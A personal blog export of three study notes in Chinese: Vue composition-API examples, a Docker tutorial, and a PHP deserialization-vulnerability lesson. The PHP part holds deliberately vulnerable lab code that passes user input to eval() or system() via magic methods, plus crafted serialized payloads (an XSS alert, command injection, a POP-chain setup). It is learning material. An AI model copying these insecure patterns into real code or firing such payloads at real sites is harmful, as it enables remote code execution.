组合式API_模板引用&lt;!-- 组合式API --&gt;&lt;template&gt;        &lt;h3 ref=&quot;message&quot;&gt;Opt&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                mounted()&#123;                        this.$refs.message.innerHTML=&#x27;OOOppt&#x27;;                &#125;        &#125;&lt;/script&gt;

&lt;!-- 选项式API --&gt;&lt;template&gt;        &lt;h3 ref=&quot;message&quot;&gt;Com&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref,onMounted&#125; from &#x27;vue&#x27;        //获取原生DOM,声明一个ref来存放该元素的引用，必须和模板中的ref同名，否则读取不到        const message = ref(null);        //修改DOM内容前提是页面已渲染，所以该操作要放在生命周期函数中        onMounted(()=&gt;&#123;                message.value.innerHTML = &#x27;CCCOOM&#x27;;        &#125;)        &lt;/script&gt;

组合式API_Props&lt;!-- 选项式API父组件 --&gt;&lt;template&gt;        &lt;OptChild msg=&quot;114514&quot; /&gt;&lt;/template&gt;&lt;script&gt;        import OptChild from &#x27;./OptChild.vue&#x27;        export default&#123;                components:&#123;                        OptChild,                &#125;        &#125;&lt;/script&gt;&lt;!-- 选项式API子组件 --&gt;&lt;template&gt;        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        props: &#123;                msg: &#123;                        type: String,                        default: &quot;&quot;                &#125;,        &#125;&#125;&lt;/script&gt;

&lt;!-- 组合式API父组件 --&gt;&lt;template&gt;        &lt;!-- 不用再去export default中挂载组件 --&gt;        &lt;ComChild msg=&quot;1919810&quot;/&gt;&lt;/template&gt;&lt;script setup&gt;        import ComChild from &#x27;./ComChild.vue&#x27;;&lt;/script&gt;&lt;!-- 组合式API子组件 --&gt;&lt;template&gt;        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;        //defineProps的方式进行接收,内部是对象的形式        defineProps(&#123;                msg:&#123;                        type:String,                        default:&quot;&quot;                &#125;,        &#125;);&lt;/script&gt;

组合式API_事件&lt;!-- 选项式API子组件 --&gt;&lt;template&gt;        &lt;button @click=&quot;sendMsg&quot;&gt;发送数据&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        message:&quot;114514&quot;                &#125;        &#125;,        methods:&#123;                sendMsg()&#123;                        this.$emit(&#x27;OnEvent&#x27;,this.message);                &#125;        &#125;&#125;&lt;/script&gt;&lt;!-- 选项式API父组件 --&gt;&lt;template&gt;        &lt;OptChild @onSomeEvent=&quot;acpt&quot; /&gt;        &lt;p&gt;接收数据:&#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        import OptChild from &#x27;./OptChild.vue&#x27;;        export default&#123;                components:&#123;                        OptChild,                &#125;,                data()&#123;                        return&#123;                                message:&quot;&quot;                        &#125;                &#125;,                methods:&#123;                        acpt(data)&#123;                                this.message = data;                        &#125;                &#125;        &#125;&lt;/script&gt;

&lt;!-- 组合式API父组件 --&gt;&lt;template&gt;        &lt;ComChild @onEvent=&quot;getMsg&quot; /&gt;        &lt;p&gt;收到数据&#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;        import ComChild from &#x27;./ComChild.vue&#x27;;        import &#123;ref&#125; from &#x27;vue&#x27;        const message = ref(&quot;&quot;);        function getMsg(data)&#123;                message.value = data;                // console.log(data);                        &#125;&lt;/script&gt;&lt;!-- 组合式API子组件 --&gt;&lt;template&gt;        &lt;button @click=&quot;sendMsg&quot;&gt;获取数据&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref&#125; from &#x27;vue&#x27;        const message = ref(&quot;1919810&quot;);        //相当于获取this.$emit        const emit = defineEmits([&quot;onEvent&quot;]);        function sendMsg()&#123;                emit(&quot;onEvent&quot;,message.value);        &#125;&lt;/script&gt;

自定义指令选项式&lt;template&gt;        &lt;!-- 用v-自定义指令来调用自定义指令 --&gt;        &lt;h3 v-jellycat&gt;hello world&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                //通过directives创建自定义指令                directives:&#123;                        //指令名                        jellycat:&#123;                                //指令要做什么                                mounted(element)&#123;                                        console.log(element);                                                                        &#125;                        &#125;                &#125;        &#125;&lt;/script&gt;



组合式&lt;template&gt;        &lt;span v-jellycat&gt;hello&lt;/span&gt;&lt;/template&gt;&lt;script setup&gt;        // 前面+v表示自定义指令        const vJellycat = &#123;                //注意写法 mouted:                mounted:(element) =&gt; &#123;                        console.log(element);                                                // 内部逻辑                &#125;        &#125;&lt;/script&gt;

全局与局部自定义指令
局部&lt;template&gt;        &lt;h3 v-scp&gt;Scoped&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        const vScp = &#123;                mounted(element)&#123;                        element.style.color = &quot;green&quot;                &#125;        &#125;&lt;/script&gt;

全局需要在main.js中创建自定义指令
import &#x27;./assets/main.css&#x27;import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;const app = createApp(App);//参数1:指令名 参数2:箭头函数,指令实现的功能app.directive(&quot;glb&quot;,(Element) =&gt; &#123;        Element.style.color = &quot;blue&quot;&#125;)app.mount(&#x27;#app&#x27;)

自定义指令的钩子函数


参数
eg.模拟v-show
&lt;template&gt;        &lt;p v-myShow=&quot;true&quot;&gt;11&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;import &#123;ref&#125; from &#x27;vue&#x27;const flag = ref(true)        const vMyShow = &#123;                mounted(el,binding,vNode,prevNode)&#123;                        if(binding.value)&#123;                                el.style.display = &#x27;block&#x27;;                        &#125;else&#123;                                el.style.display = &#x27;none&#x27;;                        &#125;                &#125;        &#125;&lt;/script&gt;

]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2025/01/06/docker/</url>
    <content><![CDATA[初识Docker环境为Ubuntu

docker就是用于解决软件跨环境迁移的问题，docker简单来说就是装了软件及其运行环境的容器


ps:md,docker好几个源都不好用，我的&#x2F;etc&#x2F;docker&#x2F;daemon.json配置如下
/*配置如下*/&#123;  &quot;registry-mirrors&quot;: [    &quot;https://hub.fast360.xyz&quot;,    &quot;https://hub.rat.dev&quot;,    &quot;https://hub.littlediary.cn&quot;,    &quot;https://docker.kejilion.pro&quot;,    &quot;https://dockerpull.cn&quot;,    &quot;https://docker-0.unsee.tech&quot;,    &quot;https://docker.tbedu.top&quot;,    &quot;https://docker.1panelproxy.com&quot;,    &quot;https://docker.melikeme.cn&quot;,    &quot;https://cr.laoyou.ip-ddns.com&quot;,    &quot;https://hub.firefly.store&quot;,    &quot;https://docker.hlmirror.com&quot;,    &quot;https://docker.m.daocloud.io&quot;,    &quot;https://docker.1panel.live&quot;,    &quot;https://image.cloudlayer.icu&quot;,    &quot;https://docker.1ms.run&quot;  ],  &quot;insecure-registries&quot;: [],  &quot;debug&quot;: false,  &quot;experimental&quot;: false,  &quot;features&quot;: &#123;    &quot;buildkit&quot;: true  &#125;,  &quot;log-driver&quot;: &quot;json-file&quot;,  &quot;log-opts&quot;: &#123;    &quot;max-size&quot;: &quot;10m&quot;,    &quot;max-file&quot;: &quot;3&quot;  &#125;&#125;



Docker架构与容器化

比如想在docker主机上运行MySQL，在docker客户机上拉取MySQL镜像（docker pull MySQL），然后docker主机就会在应用市场&#x2F;仓库中下载MySQL镜像；
客户机上运行MySQL，执行run命令(docker run MySQL)，就会创建容器，容器中放着一个或者多个应用

也可以制作自己的镜像，docker build xxx,会放在docker主机的image中，也可以将这个镜像上传到应用市场中，
docker push xxx
命令命令-镜像操作
eg：下载一个nginx
先查看仓库中有没有nginx的镜像，sudo docker search nginx（search不走配置的镜像源所以会超时，在镜像名前加上 register.liberx.info/可以解决超时问题）
然后拉到docker主机，sudo docker pull nginx,pull默认是下载最新版本，下载指定版本nginx:版本号
查看自己的镜像列表：sudo docker images&#x2F;sudo docker image ls
命令-容器操作
查看运行中&#x2F;所有容器： sudo docker ps [-a]加上-a就会显示所有容器

UP表示上线，EXITED表示结束运行
sudo docker start/stop/stats后面加的是容器名字或者容器的id（id不一定全部输完只要能区分就行，但是名字不能模糊匹配）

删除容器：sudo docker rm [-f] 容器名/容器id，不加-f那么需要停止容器再删除，-f表示强制删除
可以用$传入id
sudo docker rm -f $(sudo docker ps -aq) -aq是显示所有容器的ID
命令-run，exec运行的docker容器名字一坨，一run就阻塞终端，怎么办？
sudo docker run -d --name 想要指定的容器名 镜像名

-d表示后台运行，–name（是两个杠）给容器指定一个名字
既然占用80端口了，计网里学的80是web服务端口，那么想必可以可以用浏览器访问吧

虽然nginx运行了，还占用的80端口（web服务默认端口），但是在浏览器直接访问docker host的ip行不通

为什么会这样呢？


原因是占用的80端口只是容器的80端口而不是主机的80端口（前面说的容器就像一个更简化的虚拟机，内部的端口自然与外部主机的端口不一样），所以我们需要进行端口映射
-p 外部端口:内部端口（非常重要！！！！！）

将主机的80端口映射到容器的80端口
这下访问到nginx的主页了

怎么修改默认的这个页面呢？dockerhub中会描述镜像的默认初始页面（usr&#x2F;share&#x2F;nginx&#x2F;html）（我上不去啊）
sudo docker exec -it 容器名 /bin/bash  -it表示交互模式，&#x2F;bin&#x2F;bash表示以终端方式进入这个容器

exit退出
命令-镜像操作
sudo docker commit [选项] 选定容器 镜像
-a, --author：设置镜像作者信息。-c, --change：应用 Dockerfile 指令来创建镜像。-m, --message：提交时的说明信息。-p, --pause：在提交之前暂停容器的运行（默认为 true）

比如将前面的运行nginx的容器提交为新镜像
sudo docker commit -m &quot;commit-test&quot; -a &quot;wwwtty&quot; myNginx committest

镜像保存为一个tar文件
sudo docker save [-o 文件名.tar] 镜像名
sudo docker load -i tar包名字
load下来后就是一个镜像，直接run就可以启动容器


sudo docker login
需要有dockerhub账号
sudo docker tag 原镜像名 目标镜像名
sudo docker push 目标镜像名
存储容器内部对文件修改困难（没有vi&#x2F;vim），而且如果容器炸了或者容器重新启动就丢失修改
目录挂载

外部的目录像u盘一样 -v 外部目录:内部目录
比如将~下的html目录作为外部目录,nginx默认页面所在目录作为内部目录
sudo docker run -d --name test -p 80:80 -v ~/html:/usr/share/nginx/html nginx
这样访问服务器ip出来的就是自己预设的页面
卷映射如果想通过修改外部文件就能实现对内部配置文件的修改，需要使用卷映射
为什么不能使用目录挂载呢，因为目录挂载如果目录不存在，会先在外部创建一个空文件夹，那么挂载空文件夹，相当于启动时配置项全是空的，就启动不了容器
-v 卷名:容器中配置文件路径
卷的位置 /var/docker/volumes/卷名
显示所有的卷：sudo docker volume ls
创建卷：sudo docker volume create 卷名
显示卷的详细信息：sudo docker volume inspect 卷名
网络容器间访问怎么实现一个容器访问另一个容器？




1.可以通过run的-v端口映射
我有以下两个run起来的容器

假设从test1访问test
 sudo docker exec -it test1 bash 
sudo curl 175.27.249.106:80 
终端就会出现html

但是这样做很奇怪，相当于从test1的88端口-&gt;docker host的80端口-&gt;test的80端口，绕了一大圈
有一个叫做docker0的默认网络



查看容器细节：sudo docker container inspect 容器名/sudo docker inspect 容器名

接下来就可以通过显示出的IP地址进行访问（docker为每个容器分配唯一IP，通过ip+容器端口可以互相访问）
从test0访问test1

ubuntu@VM-0-9-ubuntu:~$ sudo docker exec -it test0 bashroot@8656267b120d:/# curl http://172.17.0.3:80 #test1容器的ip和端口


这样做也有缺点，ip是会变动的


创建自定义网络
创建mynet：sudo docker network create mynet

将容器加入自己的网络下（–network 网络名） sudo docker run -d --name test0 -p 80:80 --network mynet nginx
sudo docker inspect test0:

这样一来，容器间访问只需要进入容器-&gt;curl http://容器名:容器端口
Docker compose

上线：第一次创建并启动
下线：移除创建的容器以及相关资源
不用compose.yaml启动wordpress和mysql
#启动mysqldocker run -d -p 3306:3306 \-e MYSQL_ROOT_PASSWORD=123456 \-e MYSQL_DATABASE=wordpress \-v mysql-data:/var/lib/mysql \-v /app/myconf:/etc/mysql/conf.d \--restart always --name mysql \--network blog \mysql:8.0#启动wordpressdocker run -d -p 8080:80 \-e WORDPRESS_DB_HOST=mysql \-e WORDPRESS_DB_USER=root \-e WORDPRESS_DB_PASSWORD=123456 \-e WORDPRESS_DB_NAME=wordpress \-v wordpress:/var/www/html \--restart always --name wordpress-app \--network blog \wordpress:latest

compose.yaml格式：
name:项目名services:	应用名:		container_name: 容器名（不指定默认:项目名_应用名）		environment:			环境配置（docker run的-e），格式如 - WORDPRESS_DB_HOST=mysql 或 WORDPRESS_DB_HOST: mysql		networks:			- 网络名		ports:			- &quot;端口映射&quot;		restart:			always /……		volumes:			- 目录挂载或卷映射networks:	网络名:		更详细的配置volumes:	卷名:		更详细的配置

启动(上线)命令：sudo docker compose -f compose.yaml up -d
-d:后台运行
-f:指定yaml文件
下线命令：sudo docker compose -f compose.yaml down
如果更改了compose.yaml文件的配置，重新上线，没有被更改的应用会保持running状态；
下线并不会移除对应的卷
Dockerfiledockerfile制作镜像

比如将app.jar打包成镜像
FROM openjdk:17LABEL author=wwwttyEXPOSE 8080 #容器暴露8080端口COPY app.jar /app.jar #容器相当于一个新的操作系统要放在根目录下ENTRYPOINT java -jar app.jar#更推荐下面的写法ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;]

制作镜像命令：docker build -f dockerfile -t 镜像名:版本 ./要指明当前的目录.&#x2F;
镜像分层存储

使用docker history 镜像名查看容器构建历史（过程自下而上）
也可以使用 docker image inspect 镜像名查看更详细的信息
官方的nginx镜像（docker history）：

（docker image inspect）展现的层级:

进行目录挂载后的容器再commit的镜像：

发现多了1.09kb
（docker image inspect）展现的层级:

比官方的多了一层，多的一层就是挂载的目录
分层视角下的容器与镜像


容器就是在镜像层（只读）加上一层读写层，对容器的修改都是在可读可写层进行，所以删除容器修改都会丢失（因为读写层没了）
这样的好处是容器隔离：

可以用 docker ps -s/--size 查看读写层和只读层的关系

SIZE列 前面是读写层大小括号内是镜像大小
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞</title>
    <url>/2025/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[反序列化漏洞成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象
php面向对象基础知识php中类和对象的写法class Test&#123;	var $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）	var $id;	function __construct($name = null,$id = null)&#123;//构造函数		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;class Test&#123;	var $name;	var $id;	function __construct($name = null,$id = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;$a = new Test();$a-&gt;name=&#x27;senpai&#x27;;$a-&gt;id=114514;print_r($a);/*print_r()打印对象实例的结果就是:&gt;Test Object(    [name] =&gt; senpai    [id] =&gt; 114514)[Finished in 852ms]*/

php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this-&gt;成员变量名
序列化
可以进行序列化的内容：
对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null
不能序列化的内容：
类，资源（比如数据库连接），未定义类型

字符串长度用于确定头尾双引号位置，防止出现 &quot;benben&quot;adada&quot;这种中间带有双引号报错的情况

a:参数数量:&#123;i:索引;对应的序列化内容;&#125;


O:类名长度:&quot;类名&quot;:变量数:&#123;s:变量名长度:&quot;变量名&quot;;变量值的序列化内容;&#125;
private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)
protected属性的成员变量序列化后，变量名前会加上0x00*0x00
&lt;?php	class Test&#123;		public $name;		private $id;	&#125;	$a = 1;	$b = &#x27;hello world!&#x27;;	$c = new Test();	$d = [1,2,3,4];	$e = 1.14514;	$f = null;	echo serialize($a).&quot;\n&quot;;	echo serialize($b).&quot;\n&quot;;	echo serialize($c).&quot;\n&quot;;	echo serialize($d).&quot;\n&quot;;	echo serialize($e).&quot;\n&quot;;	echo serialize($f);?&gt;/*i:1;s:12:&quot;hello world!&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;&lt;0x00&gt;Test&lt;0x00&gt;id&quot;;N;&#125;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;&#125;d:1.14514;N;   [Finished in 1.1s]*/



反序列化反序列化就是将字符串变成对象 unserialize(string $str)


例题
get方法传进来的变量benben就是序列化字符串

/*自动把get请求收到的参数拼接到序列化字符串中*/$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:&#x27;.strlen($_GET[&#x27;benben&#x27;]).&#x27;:&quot;&#x27;.$_GET[&#x27;benben&#x27;].&#x27;&quot;;&#125;&#x27;;

构造url，用?传递get请求的参数(这里我让他弹窗)
?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;echo &quot;&lt;script&gt;alert(123);&lt;/script&gt;&quot;;&quot;;&#125;
使用var_dump()打印对象细节&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	var_dump($a);?&gt;/*object(Test)#1 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;   [Finished in 933ms]*/

&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;//复制echo内容	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

/**/&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;德川&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;�Test�name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;�*�sex&quot;;s:3:&quot;男&quot;;&#125;object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;德川&quot; 输出德川而不是最开始的淳平，因为更改了序列化字符串  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

魔术方法魔术方法：在特定条件下自动触发的方法
触发前提：魔术方法所在的类或对象被调用

魔术方法必须掌握触发时机，参数，返回值

常见魔术方法

构造与析构/*构造触发时机:当new对象时自动调用（构造器）功能:初始化对象参数:非必要返回值:无*/function __construct(args...);/*析构触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行功能:参数:无返回值:无*/function __destruct();&lt;?phpclass Test&#123;	public $name;	public function __construct()&#123;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test();//触发__construct();$str  = serialize($a);$str1 = &#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;&#x27;;$f = unserialize($str1); //触发__destruct();?&gt;//触发__destruct();    /*结果构造函数析构函数析构函数*/

unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象
&lt;?phpclass Test&#123;	public $name;	public function __construct($name = null)&#123;		$this-&gt;name = $name;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test(&#x27;淳平&#x27;);$str  = serialize($a);$f = unserialize($str);//$a被销毁了echo $a-&gt;name;//这里会警告$a为null?&gt;

漏洞例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot;;	public function __destruct()	&#123;		eval($this-&gt;cmd);//漏洞在这	&#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);//会在这调用__destruct()?&gt;

需要构造序列化字符串，将$cmd改成要执行的php命令
/*构造字符串*/$str = &#x27;O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;&#x27;;

构造url，拼接参数?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;到localhost/ser后
sleep先进行__sleep()再serialize()

function __sleep();/*返回要序列化的属性名的数组触发时机：执行serialize()之前功能：返回需要被序列化的成员参数：无返回值：包含需要被序列化的成员属性名的数组*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public  function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);//返回包含属性名的数组	&#125;	&#125;$a = new User(&#x27;淳平&#x27;,114514,&#x27;114514&#x27;);echo serialize($a);//结果中将不会有password-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - /*O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;*/

例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	const SITE = &#x27;uusama&#x27;;	public $username;	public $nickname;	private $password;	public function __construct($username, $nickname, $password)	&#123;		$this-&gt;username = $username;		$this-&gt;nickname = $nickname;		$this-&gt;password = $password;	&#125;	public function __sleep()	&#123;		system($this-&gt;username);//漏洞	&#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;

因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行
wakeup
function __wakeup();/*触发时机：unserialize()之前功能：参数：返回值：*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);	&#125;	public function __wakeup()&#123;		$this-&gt;password = &#x27;114514&#x27;;//反序列化前调用，给password赋值	&#125;&#125;$str = &#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;&#x27;;//没有passwordvar_dump(unserialize($str));//password有值了?&gt;/*object(User)#1 (3) &#123;  [&quot;name&quot;]=&gt;  string(6) &quot;淳平&quot;  [&quot;id&quot;]=&gt;  int(114514)  [&quot;password&quot;:&quot;User&quot;:private]=&gt;  string(6) &quot;114514&quot;&#125;*/

例题 &lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);//漏洞    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];//需要构造一个含有username的序列化字符串unserialize($user_ser);?&gt;

思路:构造get参数为一个含有username的序列化字符串，username值为任意命令																		payload:  ?benben=O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
toString和invokefunction __toString();/*触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()功能：参数：返回值：字符串*/function __invoke();/*触发时机：把对象当作方法(函数)调用功能：参数：返回值：字符串*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __tostring()&#123;		return &#x27;这不是字符串!&#x27;;	&#125;	public function __invoke()&#123;		return &#x27;这不是方法!!&#x27;;	&#125;&#125;$a = new User(1,&#x27;a&#x27;,&#x27;c&#x27;);echo $a;//输出这不是字符串echo $a();//输出这不是方法?&gt;

错误调用相关魔术方法call
function __call($arg1,$arg2);/*触发时机:调用不存在的成员方法功能：参数:$arg1:方法名 $arg2:参数值的数组返回值:无*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __call($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;//把传进去的所有参数打印出来			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a-&gt;test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);//会调用call()?&gt;/*testabc*/

callStatic
function __callStatic($arg1,$arg2);/*php中调用成员常量或静态调用: ::$arg1:方法名	$arg2:参数值的数组*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public static function __callStatic($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a::test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);?&gt;

get
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __get($arg1)	&#123;		echo $arg1;	&#125;&#125;$a = new User();$a-&gt;var2;?&gt;

set
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __set($arg1,$arg2)&#123;		echo $arg1.$arg2;	&#125;&#125;$a = new User();$a-&gt;var2 = &#x27;111&#x27;;//会输出var2111?&gt;

isset
/*arg1就是不可访问变量的属性名*/&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __isset($arg1)&#123;		echo $arg1;	&#125;&#125;$a = new User();isset($a-&gt;password);//私有成员不可访问empty($a-&gt;password);?&gt;

unset
clone
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __clone()&#123;		echo &#x27;cloned!&#x27;;	&#125; &#125;$a = new User();$b = clone($a);//输出cloned!?&gt;

总结表

pop链前置知识 &lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);//&lt;-漏洞    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;

反推法1.先找漏洞在哪，eval()函数处有漏洞2.eval调用evil的$test23.但是单单unserialize()并不会调用evil的action()4.unserialize()会调用__destruct()5.但是__destruct()中的$test是normal的实例6.要想办法构造序列化字符串使index中的$test变成evil的实例

构造序列化字符串
方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串
